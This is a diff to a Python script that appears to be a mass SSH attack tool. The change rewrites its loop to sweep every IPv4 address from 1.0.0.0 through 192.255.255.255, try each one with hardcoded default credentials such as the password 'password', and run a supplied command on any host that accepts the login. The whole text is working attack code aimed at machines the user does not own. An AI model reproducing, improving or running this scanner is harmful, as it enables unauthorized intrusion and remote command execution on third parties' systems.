@@ -21,22 +21,16 @@ if(selection == 1):
 elif(selection == 2):
 	password = "password"
 
-ip = [1, 0, 0, 0]
-
-while(run == True):
-	try:
-		ssh.connect(ip, username=username, password=password)
-		ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
-		print("IP " + str(ip) + " SUCCESS")
-	except:
-		print("IP " + str(ip) + " FAIL") 
-	if(ip[3] < 255):
-		ip[3] += 1
-	elif(ip[2] < 255):
-		ip[2] += 1
-	elif(ip[1] < 255):
-		ip[1] += 1
-	elif(ip[0] < 191):
-		ip[0] += 1
-	else:
-		print("ALL POSSIBLE IP ADDR. TRIED")
+for a in range(192):
+	a = a + 1
+	for b in range(256):
+		for c in range(256):
+			for d in range(256):
+				ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
+				print("TRY IP " + ip)
+				try:
+					ssh.connect(ip, username=username, password=password)
+					ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
+					print("IP " + str(ip) + " SUCCESS")
+				except:
+					print("IP " + str(ip) + " FAIL") 
